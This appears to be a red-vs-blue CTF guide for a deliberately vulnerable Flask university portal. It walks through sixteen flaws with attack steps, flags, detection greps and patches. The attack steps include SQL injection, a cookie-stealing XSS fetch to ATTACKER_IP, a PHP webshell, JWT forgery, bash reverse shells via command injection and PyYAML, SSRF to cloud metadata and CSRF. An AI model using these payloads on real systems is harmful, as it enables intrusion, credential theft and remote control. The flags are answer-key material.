# Vidyatech University Portal — Complete Red vs Blue Guide

> Target app: Flask-based intentionally vulnerable university portal
> 16 vulnerabilities across Easy / Intermediate / Advanced tiers
> Blue Team patches via `/api/patch` (Easy/Intermediate) and `/blueteam/advanced-patch` (Advanced)

---

## How the Patch System Works

**Easy & Intermediate vulns** — patched via the Blue Team monitor API:
```bash
curl -X POST http://TARGET:5000/api/patch \
  -H "Content-Type: application/json" \
  -H "X-Patch-Secret: NEXSUS_BLUE_2024" \
  -d '{"vuln_id": "<id>", "enabled": true, "name": "<name>"}'
```

**Advanced vulns** — patched via the in-app panel:
```
URL: http://TARGET:5000/blueteam/advanced-patch
PIN: VT@ADVANCED2024
```

Check current patch state:
```bash
curl http://TARGET:5000/api/patches
```

All requests are logged to `/tmp/vidyatech_access.log` — Blue Team monitors this file.

---

## Credentials Reference

| Portal | ID / Username | Password | Role |
|--------|--------------|----------|------|
| Student login `/login` | VTU2021001 | arjun123 | Student |
| Student login `/login` | VTU2021002 | priya456 | Student |
| Staff login `/staff/login` | FAC001 | admin123 | Admin |
| Staff login `/staff/login` | FAC002 | faculty2024 | Faculty |
| Admin panel `/admin/login` | admin | admin@123 | Sysadmin |

---

---

# EASY VULNERABILITIES

---

## VULN 1 — SQL Injection | `/login`

**How it works:**
The login form builds the SQL query using Python f-string formatting — no parameterisation.
```python
query = f"SELECT * FROM students WHERE roll_no='{roll}' AND password='{pwd}'"
```
Any input goes directly into the SQL string, so an attacker can break out of the string and rewrite the query logic.

**Red Team Attack:**

Step 1 — Open `http://TARGET:5000/login`

Step 2 — In the Roll Number field enter:
```
' OR '1'='1'--
```
Leave password blank. This turns the query into:
```sql
SELECT * FROM students WHERE roll_no='' OR '1'='1'--' AND password=''
```
The `--` comments out the password check. `'1'='1'` is always true → login succeeds as the first student.

Step 3 — Dump the database with sqlmap:
```bash
sqlmap -u http://TARGET:5000/login \
  --data="roll_no=x&password=x" \
  --dbs --dump --batch
```

**Flag:** `VT{sql_inj3ction_login_bypass}`

**Blue Team — Detect:**
Watch the log for single-quote characters or `OR 1=1` patterns in POST body:
```bash
grep "roll_no=" /tmp/vidyatech_access.log | grep "'"
```

**Blue Team — Patch:**
```bash
curl -X POST http://TARGET:5000/api/patch \
  -H "Content-Type: application/json" \
  -H "X-Patch-Secret: NEXSUS_BLUE_2024" \
  -d '{"vuln_id": "sqli_login", "enabled": true, "name": "SQL Injection Login"}'
```
After patch, the code switches to parameterised queries:
```python
student = _fetchone(db, "SELECT * FROM students WHERE roll_no=? AND password=?", (roll, pwd))
```

---

## VULN 2 — Stored XSS | `/notices/post`

**How it works:**
Notice title and content are stored in the database and rendered back to all users without HTML escaping. Any logged-in user can post a notice.

**Red Team Attack:**

Step 1 — Log in as any student (VTU2021001 / arjun123)

Step 2 — Go to `http://TARGET:5000/notices/post`

Step 3 — In the Content field, enter:
```html
<script>alert(document.cookie)</script>
```

Step 4 — Submit. Now visit `http://TARGET:5000/notices` — the script executes for every visitor.

More dangerous payload (steal cookies to attacker server):
```html
<script>fetch('http://ATTACKER_IP:8000/?c='+document.cookie)</script>
```
Run a listener on attacker machine:
```bash
python3 -m http.server 8000
```

**Flag:** `VT{stored_xss_n0tice_b0ard}`

**Blue Team — Detect:**
```bash
grep "script" /tmp/vidyatech_access.log | grep "notices"
```

**Blue Team — Patch:**
```bash
curl -X POST http://TARGET:5000/api/patch \
  -H "Content-Type: application/json" \
  -H "X-Patch-Secret: NEXSUS_BLUE_2024" \
  -d '{"vuln_id": "stored_xss", "enabled": true, "name": "Stored XSS Notices"}'
```
After patch, all input is HTML-escaped before storage:
```python
content = html.escape(content)
title   = html.escape(title)
```

---

## VULN 3 — Default Credentials | `/staff/login`

**How it works:**
Staff accounts were seeded with default passwords that were never changed. The credentials are even leaked in `robots.txt`.

**Red Team Attack:**

Step 1 — Visit `http://TARGET:5000/robots.txt` — you'll see:
```
# Dev note: default staff login FAC001 / admin123
```

Step 2 — Go to `http://TARGET:5000/staff/login`

Step 3 — Enter:
```
Employee ID: FAC001
Password:    admin123
```
You're now logged in as admin with access to the full admin dashboard.

Brute force with Hydra:
```bash
hydra -L emp_ids.txt -P rockyou.txt \
  http-post-form 'TARGET:5000/staff/login:emp_id=^USER^&password=^PASS^:Invalid'
```

**Flag:** `VT{d3fault_cr3ds_staff_portal}`

**Blue Team — Detect:**
```bash
grep "staff/login" /tmp/vidyatech_access.log | grep "200"
```

**Blue Team — Patch:**
```bash
curl -X POST http://TARGET:5000/api/patch \
  -H "Content-Type: application/json" \
  -H "X-Patch-Secret: NEXSUS_BLUE_2024" \
  -d '{"vuln_id": "default_creds", "enabled": true, "name": "Default Credentials"}'
```
After patch, any login attempt using the known default passwords is rejected.

---

## VULN 4 — Directory Traversal | `/resources/download`

**How it works:**
The file download endpoint takes a `file` query parameter and joins it directly to the `static/files/` path with no sanitisation. An attacker can use `../` sequences to escape the intended directory.

**Red Team Attack:**

Step 1 — Normal usage: `http://TARGET:5000/resources/download?file=syllabus_cse.pdf`

Step 2 — Traverse to the database backup:
```
http://TARGET:5000/resources/download?file=../../data/db_backup_jan2024.sql
```
This file contains plaintext passwords and the secret key.

Step 3 — Read the config file:
```
http://TARGET:5000/resources/download?file=../../data/config.json
```
This exposes AWS keys, SMTP password, and admin token.

Step 4 — Read system files (Linux):
```
http://TARGET:5000/resources/download?file=../../../etc/passwd
```

**Flag:** `VT{dir_trav3rsal_file_l3ak}`

**Blue Team — Detect:**
```bash
grep "resources/download" /tmp/vidyatech_access.log | grep "\.\."
```

**Blue Team — Patch:**
```bash
curl -X POST http://TARGET:5000/api/patch \
  -H "Content-Type: application/json" \
  -H "X-Patch-Secret: NEXSUS_BLUE_2024" \
  -d '{"vuln_id": "dir_traversal", "enabled": true, "name": "Directory Traversal"}'
```
After patch, `os.path.basename()` strips all path components, leaving only the filename.

---

## VULN 5 — Sensitive Data Exposure | `/robots.txt` + `/.env`

**How it works:**
`robots.txt` contains developer comments with credentials and internal paths. The `.env` file is directly accessible and returns plaintext secrets.

**Red Team Attack:**

Step 1:
```bash
curl http://TARGET:5000/robots.txt
```
Returns:
```
# Backup: /data/db_backup_jan2024.sql
# Dev note: default staff login FAC001 / admin123
# Internal API token: Bearer vt-internal-7f3a2b9c4d5e6f
```

Step 2:
```bash
curl http://TARGET:5000/.env
```
Returns:
```
SECRET_KEY=vidyatech@2024secret
SMTP_PASSWORD=VidyaTech_smtp@2024
PAYMENT_API_KEY=pk_live_vtuniv_9f2a3b4c
ADMIN_DEFAULT_PASS=admin123
```

**Flag:** `VT{s3nsitive_data_3xpos3d}`

**Blue Team — Detect:**
```bash
grep "robots.txt\|\.env" /tmp/vidyatech_access.log
```

**Blue Team — Patch:**
```bash
curl -X POST http://TARGET:5000/api/patch \
  -H "Content-Type: application/json" \
  -H "X-Patch-Secret: NEXSUS_BLUE_2024" \
  -d '{"vuln_id": "data_exposure", "enabled": true, "name": "Sensitive Data Exposure"}'
```
After patch, `robots.txt` returns only safe content and `/.env` returns 404.

---

## VULN 11 — Hardcoded Admin Login | `/admin/login`

**How it works:**
A separate admin table exists with a hardcoded `admin / admin@123` credential that was never changed. This portal is separate from the staff login.

**Red Team Attack:**

Step 1 — Navigate to `http://TARGET:5000/admin/login`

Step 2 — Enter:
```
Username: admin
Password: admin@123
```
Full admin dashboard access granted.

**Flag:** `VT{hardc0ded_adm1n_cred5}`

**Blue Team — Detect:**
```bash
grep "admin/login" /tmp/vidyatech_access.log | grep "200"
```

**Blue Team — Patch:**
```bash
curl -X POST http://TARGET:5000/api/patch \
  -H "Content-Type: application/json" \
  -H "X-Patch-Secret: NEXSUS_BLUE_2024" \
  -d '{"vuln_id": "hardcoded_admin", "enabled": true, "name": "Hardcoded Admin"}'
```
After patch, the default password `admin@123` is explicitly rejected.

---

## VULN 12 — Unrestricted File Upload | `/student/document/upload`

**How it works:**
The upload form says "PDF only" but performs zero extension or MIME type validation. Any file type is accepted and saved to `static/uploads/` with its original filename.

**Red Team Attack:**

Step 1 — Log in as a student

Step 2 — Create a PHP webshell:
```php
<?php system($_GET['cmd']); ?>
```
Save as `shell.php`

Step 3 — Upload via the document upload form

Step 4 — Access the webshell:
```
http://TARGET:5000/static/uploads/shell.php?cmd=whoami
http://TARGET:5000/static/uploads/shell.php?cmd=cat+/etc/passwd
http://TARGET:5000/static/uploads/shell.php?cmd=ls+-la+/app
```

**Flag:** `VT{unr3strict3d_d0c_upl0ad}`

**Blue Team — Detect:**
```bash
grep "upload" /tmp/vidyatech_access.log | grep -v ".pdf"
```

**Blue Team — Patch:**
```bash
curl -X POST http://TARGET:5000/api/patch \
  -H "Content-Type: application/json" \
  -H "X-Patch-Secret: NEXSUS_BLUE_2024" \
  -d '{"vuln_id": "doc_upload_bypass", "enabled": true, "name": "File Upload Bypass"}'
```
After patch, only `.pdf` extensions are accepted.

---

## VULN 14 — Clickjacking | All pages

**How it works:**
No `X-Frame-Options` or `Content-Security-Policy: frame-ancestors` header is set. Any page can be embedded in an attacker's `<iframe>`, enabling UI redress attacks.

**Red Team Attack:**

Step 1 — Create `attack.html` on attacker server:
```html
<html>
<body>
  <h1>Win a Prize!</h1>
  <iframe src="http://TARGET:5000/login" 
          width="800" height="600" 
          style="opacity:0.01; position:absolute; top:0; left:0;">
  </iframe>
  <button style="position:absolute; top:200px; left:200px;">Click to Claim</button>
</body>
</html>
```

Step 2 — Victim clicks the "button" but actually clicks the invisible login form underneath.

**Flag:** `VT{cl1ckj4ck1ng_n0_xfr4me}`

**Blue Team — Patch:**
```bash
curl -X POST http://TARGET:5000/api/patch \
  -H "Content-Type: application/json" \
  -H "X-Patch-Secret: NEXSUS_BLUE_2024" \
  -d '{"vuln_id": "clickjacking_fix", "enabled": true, "name": "Clickjacking"}'
```
After patch, every response includes:
```
X-Frame-Options: DENY
Content-Security-Policy: frame-ancestors 'none'
```

---

## VULN 15 — Weak Password Policy | `/account/change-password`

**How it works:**
The password change form accepts any value — single characters, empty strings, trivially guessable passwords. No length or complexity enforcement.

**Red Team Attack:**

Step 1 — Log in as a student

Step 2 — Go to `/account/change-password`

Step 3 — Set new password to `1` — it's accepted

Step 4 — Now the account can be brute-forced trivially

**Flag:** `VT{w34k_p4ssw0rd_p0l1cy}`

**Blue Team — Patch:**
```bash
curl -X POST http://TARGET:5000/api/patch \
  -H "Content-Type: application/json" \
  -H "X-Patch-Secret: NEXSUS_BLUE_2024" \
  -d '{"vuln_id": "weak_password", "enabled": true, "name": "Weak Password Policy"}'
```
After patch, passwords shorter than 8 characters are rejected.

---

---

# INTERMEDIATE VULNERABILITIES

---

## VULN 6 — JWT alg:none | `/api/token` + `/api/me`

**How it works:**
The custom JWT decoder checks if `alg` is `"none"` and if so, skips signature verification entirely. An attacker can craft a token with any payload and set `alg: none` to bypass authentication.

**Red Team Attack:**

Step 1 — Get a legitimate token first:
```bash
curl -X POST http://TARGET:5000/api/token \
  -H "Content-Type: application/json" \
  -d '{"roll_no": "VTU2021001", "password": "arjun123"}'
```

Step 2 — Craft a forged token in Python (no secret needed):
```python
import base64, json

# Header with alg:none
header = base64.urlsafe_b64encode(
    json.dumps({"alg": "none", "typ": "JWT"}).encode()
).rstrip(b'=').decode()

# Payload claiming to be staff ID 1 (admin)
payload = base64.urlsafe_b64encode(
    json.dumps({"student_id": 1, "roll_no": "FAC001", "role": "admin"}).encode()
).rstrip(b'=').decode()

# Empty signature
token = f"{header}.{payload}."
print(token)
```

Step 3 — Use the forged token:
```bash
curl http://TARGET:5000/api/me \
  -H "Authorization: Bearer <forged_token>"
```
Returns the admin user's data without knowing any password.

**Flag:** `VT{jwt_alg_n0ne_forg3d}`

**Blue Team — Detect:**
```bash
grep "api/me" /tmp/vidyatech_access.log
# Then decode the Authorization header from suspicious requests
# Look for base64 header containing "alg":"none"
```

**Blue Team — Patch:**
```bash
curl -X POST http://TARGET:5000/api/patch \
  -H "Content-Type: application/json" \
  -H "X-Patch-Secret: NEXSUS_BLUE_2024" \
  -d '{"vuln_id": "jwt_alg_none", "enabled": true, "name": "JWT alg:none"}'
```
After patch, any token with `alg: none` is immediately rejected and returns 403.

---

## VULN 7 — IDOR (Insecure Direct Object Reference) | `/api/result/<id>`

**How it works:**
The results API returns any result record by its integer ID with no check that the requesting student actually owns that record. Any authenticated student can read any other student's grades.

**Red Team Attack:**

Step 1 — Log in as any student

Step 2 — Enumerate all result records:
```bash
for i in $(seq 1 10); do
  curl -s http://TARGET:5000/api/result/$i
  echo ""
done
```

Or with Burp Suite Intruder — set the ID as the payload position and iterate 1–20.

Step 3 — All 6 result records (belonging to 5 different students) are returned regardless of who is logged in.

**Flag:** `VT{id0r_r3sult_l3ak}`

**Blue Team — Detect:**
```bash
grep "api/result" /tmp/vidyatech_access.log
# Look for sequential ID enumeration from the same IP
```

**Blue Team — Patch:**
```bash
curl -X POST http://TARGET:5000/api/patch \
  -H "Content-Type: application/json" \
  -H "X-Patch-Secret: NEXSUS_BLUE_2024" \
  -d '{"vuln_id": "idor", "enabled": true, "name": "IDOR Results"}'
```
After patch, the endpoint checks `session["user"]["id"]` against `result["student_id"]` and returns 403 if they don't match.

---

## VULN 8 — Command Injection | `/tools/nslookup`

**How it works:**
The DNS lookup tool passes user input directly to the OS shell using `subprocess.check_output(..., shell=True)`. The shell interprets special characters like `;`, `&&`, `|`, allowing arbitrary command execution.

**Red Team Attack:**

Step 1 — Go to `http://TARGET:5000/tools/nslookup` (requires login)

Step 2 — In the domain field, enter:
```
vidyatech.edu; whoami
```
The shell executes: `nslookup vidyatech.edu; whoami` — both commands run.

Step 3 — Escalate:
```
vidyatech.edu; cat /etc/passwd
vidyatech.edu; ls -la /app
vidyatech.edu; env
vidyatech.edu; cat data/config.json
```

Step 4 — Reverse shell (set up listener first: `nc -lvnp 4444`):
```
vidyatech.edu; bash -i >& /dev/tcp/ATTACKER_IP/4444 0>&1
```

**Flag:** `VT{cmd_inj3ction_nsl00kup}`

**Blue Team — Detect:**
```bash
grep "nslookup" /tmp/vidyatech_access.log | grep -E ";\|&&|\|"
```

**Blue Team — Patch:**
```bash
curl -X POST http://TARGET:5000/api/patch \
  -H "Content-Type: application/json" \
  -H "X-Patch-Secret: NEXSUS_BLUE_2024" \
  -d '{"vuln_id": "cmd_injection", "enabled": true, "name": "Command Injection"}'
```
After patch, the command is passed as a list (no shell expansion):
```python
subprocess.check_output(["nslookup", domain], ...)
```
Shell metacharacters are treated as literal characters, not operators.

---

## VULN 16 — CSRF (Email Hijack) | `/account/update-email`

**How it works:**
The email update form has no CSRF token. A victim who is logged in can be tricked into visiting an attacker's page that silently submits a form to change their email address.

**Red Team Attack:**

Step 1 — Create `csrf_attack.html` on attacker's server:
```html
<html>
<body onload="document.forms[0].submit()">
  <form action="http://TARGET:5000/account/update-email" method="POST">
    <input type="hidden" name="email" value="attacker@evil.com">
  </form>
  <p>Loading prize page...</p>
</body>
</html>
```

Step 2 — Send the link to a logged-in student

Step 3 — When they visit the page, their email is silently changed to `attacker@evil.com`

Step 4 — Attacker can now use "forgot password" to take over the account

**Flag:** `VT{csrf_3mail_hij4ck}`

**Blue Team — Detect:**
```bash
grep "update-email" /tmp/vidyatech_access.log
# Look for POST requests with unusual Referer headers (or no Referer)
```

**Blue Team — Patch:**
```bash
curl -X POST http://TARGET:5000/api/patch \
  -H "Content-Type: application/json" \
  -H "X-Patch-Secret: NEXSUS_BLUE_2024" \
  -d '{"vuln_id": "csrf_email", "enabled": true, "name": "CSRF Email Update"}'
```
After patch, a random CSRF token is generated on GET and validated on POST. Forged cross-origin requests lack the token and are rejected.

---

---

# ADVANCED VULNERABILITIES

> These three are patched via the Advanced Patch Panel, not the API.
> URL: `http://TARGET:5000/blueteam/advanced-patch`
> PIN: `VT@ADVANCED2024`

---

## VULN 9 — PyYAML RCE | `/tools/yaml-import`

**How it works:**
The staff YAML bulk-import tool calls `yaml.unsafe_load()` on user-supplied input. PyYAML's unsafe loader supports Python-specific tags like `!!python/object/apply:` which can instantiate arbitrary Python objects and call any function — including OS commands.

**Red Team Attack:**

Step 1 — Log in as staff (FAC001 / admin123)

Step 2 — Go to `http://TARGET:5000/tools/yaml-import`

Step 3 — Paste this payload in the YAML input box:
```yaml
!!python/object/apply:subprocess.check_output
- [id]
```
The output of `id` command is returned in the page.

Step 4 — Read sensitive files:
```yaml
!!python/object/apply:subprocess.check_output
- ["cat", "/app/data/config.json"]
```

Step 5 — Reverse shell (listener: `nc -lvnp 4444`):
```yaml
!!python/object/apply:os.system
- "bash -i >& /dev/tcp/ATTACKER_IP/4444 0>&1"
```

Or via curl:
```bash
curl -X POST http://TARGET:5000/tools/yaml-import \
  -b "session=<staff_session_cookie>" \
  --data-urlencode 'yaml_input=!!python/object/apply:subprocess.check_output
- [id]'
```

**Flag:** `VT{yaml_rce_uns4fe_l0ad}`

**Blue Team — Detect:**
```bash
grep "yaml-import" /tmp/vidyatech_access.log
# Look for POST requests — any POST to this endpoint is suspicious
# Also watch for unusual process spawning on the host
```

**Blue Team — Patch:**
1. Go to `http://TARGET:5000/blueteam/advanced-patch`
2. Enter PIN: `VT@ADVANCED2024`
3. Click "Apply Patch" next to "YAML RCE"

After patch, `yaml.safe_load()` is used instead of `yaml.unsafe_load()`. Safe load does not support Python object tags — the payload is rejected with a parse error.

---

## VULN 10 — Debug Endpoint → Session Forgery | `/debug`

**How it works:**
The `/debug` route returns the Flask `secret_key` in plaintext JSON. Flask uses this key to sign session cookies (itsdangerous). With the key, an attacker can forge any session cookie — including an admin session — using `flask-unsign`.

**Red Team Attack:**

Step 1 — Fetch the secret key:
```bash
curl http://TARGET:5000/debug
```
Response includes:
```json
{
  "secret_key": "vidyatech@2024secret",
  "config": {
    "aws_key": "AKIAIOSFODNN7VIDYATECH",
    "admin_token": "Bearer vt-internal-7f3a2b9c4d5e6f"
  }
}
```

Step 2 — Install flask-unsign:
```bash
pip install flask-unsign
```

Step 3 — Forge an admin session cookie:
```bash
flask-unsign --sign \
  --cookie '{"role": "admin", "user": {"id": 1, "name": "admin", "emp_id": "SYSADMIN"}}' \
  --secret 'vidyatech@2024secret'
```
Copy the output cookie value.

Step 4 — Set the cookie in your browser:
- Open DevTools → Application → Cookies
- Set `session` = `<forged_value>`

Step 5 — Visit `http://TARGET:5000/admin` — full admin dashboard, no password needed.

**Flag:** `VT{d3bug_s3cr3t_k3y_forg3d}`

**Blue Team — Detect:**
```bash
grep "GET /debug" /tmp/vidyatech_access.log
# Any access to /debug is an immediate red flag
```

**Blue Team — Patch:**
1. Go to `http://TARGET:5000/blueteam/advanced-patch`
2. Enter PIN: `VT@ADVANCED2024`
3. Click "Apply Patch" next to "Debug → Session Forgery"

After patch, `/debug` returns HTTP 403 with:
```json
{"error": "Debug endpoint has been disabled by the security team."}
```

---

## VULN 13 — SSRF → Internal Network Pivot | `/tools/fetch-url`

**How it works:**
The URL health checker fetches any URL provided by the user with no IP validation. An attacker can point it at internal services (localhost, 10.x.x.x, 172.16.x.x, 192.168.x.x) that are not accessible from the outside. This can expose internal APIs, config dumps, and cloud metadata.

**Red Team Attack:**

Step 1 — Go to `http://TARGET:5000/tools/fetch-url` (requires login)

Step 2 — Fetch the internal debug endpoint (not accessible externally):
```
url: http://127.0.0.1:5000/debug
```
Returns the full config including `secret_key` — combine with VULN 10 for full admin takeover.

Step 3 — Fetch the internal-only config API:
```
url: http://127.0.0.1:5000/api/internal/config
```
Returns AWS keys, SMTP password, admin token.

Step 4 — AWS cloud metadata (if running on EC2):
```
url: http://169.254.169.254/latest/meta-data/
url: http://169.254.169.254/latest/meta-data/iam/security-credentials/
```

Step 5 — Port scan internal network via SSRF:
```
url: http://10.0.0.1:22
url: http://10.0.0.1:3306
url: http://10.0.0.1:6379
```
Timing differences reveal open vs closed ports.

Via curl:
```bash
curl -X POST http://TARGET:5000/tools/fetch-url \
  -b "session=<session_cookie>" \
  -d "url=http://127.0.0.1:5000/api/internal/config"
```

**Flag:** `VT{ssrf_1ntern4l_p1v0t}`

**Blue Team — Detect:**
```bash
grep "fetch-url" /tmp/vidyatech_access.log
# Look for POST requests with 127.0.0.1, 10., 172.16., 192.168., 169.254. in body
grep "fetch-url" /tmp/vidyatech_access.log | grep -E "127\.|10\.|172\.16\.|192\.168\.|169\.254\."
```

**Blue Team — Patch:**
1. Go to `http://TARGET:5000/blueteam/advanced-patch`
2. Enter PIN: `VT@ADVANCED2024`
3. Click "Apply Patch" next to "SSRF → Internal Pivot"

After patch, the URL is resolved to an IP and checked against private ranges:
```python
_PRIVATE = [
    ipaddress.ip_network("127.0.0.0/8"),
    ipaddress.ip_network("10.0.0.0/8"),
    ipaddress.ip_network("172.16.0.0/12"),
    ipaddress.ip_network("192.168.0.0/16"),
    ipaddress.ip_network("169.254.0.0/16"),
]
```
Any URL resolving to a private IP is blocked with a 400 error.

---

---

# BLUE TEAM MONITORING GUIDE

---

## Log File Location

All HTTP requests are written to:
```
/tmp/vidyatech_access.log
```

Log format:
```
HH:MM:SS METHOD /path?query | body=<form_data> | ip=<client_ip> | status=<code>
```

Patch events are also logged:
```
HH:MM:SS [BLUE_TEAM] PATCH_APPLIED | vuln=sqli_login | name=SQL Injection Login | ip=monitor | status=200
```

---

## Real-Time Monitoring Commands

Watch all traffic live:
```bash
tail -f /tmp/vidyatech_access.log
```

Watch only attack-relevant traffic:
```bash
tail -f /tmp/vidyatech_access.log | grep -E "'\s*OR|script>|\.\.\/|nslookup|yaml-import|fetch-url|debug"
```

Count requests per IP (detect scanners):
```bash
awk '{print $NF}' /tmp/vidyatech_access.log | sort | uniq -c | sort -rn | head -20
```

Find all 200 responses to sensitive endpoints:
```bash
grep -E "admin|staff/login|debug|yaml|fetch-url" /tmp/vidyatech_access.log | grep "status=200"
```

---

## Attack Detection Cheatsheet

| Attack | Log Pattern to Watch |
|--------|---------------------|
| SQL Injection | `body=` containing `'`, `OR 1=1`, `--`, `UNION` |
| Stored XSS | `body=` containing `<script`, `onerror=`, `javascript:` |
| Default Creds | `POST /staff/login` or `/admin/login` with `status=200` |
| Dir Traversal | `resources/download` with `..` in query |
| Data Exposure | `GET /robots.txt` or `GET /.env` |
| JWT Forgery | `GET /api/me` — decode Authorization header, check alg field |
| IDOR | Sequential `GET /api/result/1`, `/api/result/2`, etc. from same IP |
| Cmd Injection | `POST /tools/nslookup` body containing `;`, `&&`, `\|` |
| YAML RCE | Any `POST /tools/yaml-import` |
| Debug Leak | `GET /debug` with `status=200` |
| SSRF | `POST /tools/fetch-url` body containing `127.`, `10.`, `169.254.` |
| File Upload | `POST /student/document/upload` with non-pdf filename |
| CSRF | `POST /account/update-email` with no or external Referer |

---

## Patch Status Check

Check which patches are currently active:
```bash
curl http://TARGET:5000/api/patches
```

Example response:
```json
{
  "sqli_login": true,
  "stored_xss": false,
  "default_creds": true,
  "dir_traversal": false,
  "data_exposure": true,
  "jwt_alg_none": false,
  "idor": true,
  "cmd_injection": false,
  "doc_upload_bypass": false,
  "hardcoded_admin": false,
  "clickjacking_fix": false,
  "weak_password": false,
  "csrf_email": false
}
```

---

## Full Patch-All Script (Blue Team Emergency)

```bash
#!/bin/bash
TARGET="http://localhost:5000"
SECRET="NEXSUS_BLUE_2024"

VULNS=(
  "sqli_login:SQL Injection Login"
  "stored_xss:Stored XSS"
  "default_creds:Default Credentials"
  "dir_traversal:Directory Traversal"
  "data_exposure:Sensitive Data Exposure"
  "jwt_alg_none:JWT alg:none"
  "idor:IDOR Results"
  "cmd_injection:Command Injection"
  "doc_upload_bypass:File Upload Bypass"
  "hardcoded_admin:Hardcoded Admin"
  "clickjacking_fix:Clickjacking"
  "weak_password:Weak Password"
  "csrf_email:CSRF Email"
)

for entry in "${VULNS[@]}"; do
  ID="${entry%%:*}"
  NAME="${entry##*:}"
  curl -s -X POST "$TARGET/api/patch" \
    -H "Content-Type: application/json" \
    -H "X-Patch-Secret: $SECRET" \
    -d "{\"vuln_id\": \"$ID\", \"enabled\": true, \"name\": \"$NAME\"}" \
    | python3 -m json.tool
  echo "Patched: $NAME"
done

echo ""
echo "Advanced patches require manual toggle at: $TARGET/blueteam/advanced-patch"
echo "PIN: VT@ADVANCED2024"
```

---

## Vulnerability Summary Table

| # | Name | Endpoint | Level | Patch ID |
|---|------|----------|-------|----------|
| 1 | SQL Injection | POST /login | Easy | `sqli_login` |
| 2 | Stored XSS | POST /notices/post | Easy | `stored_xss` |
| 3 | Default Credentials | POST /staff/login | Easy | `default_creds` |
| 4 | Directory Traversal | GET /resources/download | Easy | `dir_traversal` |
| 5 | Sensitive Data Exposure | GET /robots.txt, /.env | Easy | `data_exposure` |
| 11 | Hardcoded Admin Login | POST /admin/login | Easy | `hardcoded_admin` |
| 12 | Unrestricted File Upload | POST /student/document/upload | Easy | `doc_upload_bypass` |
| 14 | Clickjacking | All pages | Easy | `clickjacking_fix` |
| 15 | Weak Password Policy | POST /account/change-password | Easy | `weak_password` |
| 6 | JWT alg:none | GET /api/me | Intermediate | `jwt_alg_none` |
| 7 | IDOR | GET /api/result/<id> | Intermediate | `idor` |
| 8 | Command Injection | POST /tools/nslookup | Intermediate | `cmd_injection` |
| 16 | CSRF Email Hijack | POST /account/update-email | Intermediate | `csrf_email` |
| 9 | PyYAML RCE | POST /tools/yaml-import | Advanced | Advanced Panel |
| 10 | Debug → Session Forgery | GET /debug | Advanced | Advanced Panel |
| 13 | SSRF → Internal Pivot | POST /tools/fetch-url | Advanced | Advanced Panel |

---

*Guide generated for Vidyatech University Portal — Red vs Blue CTF Event*
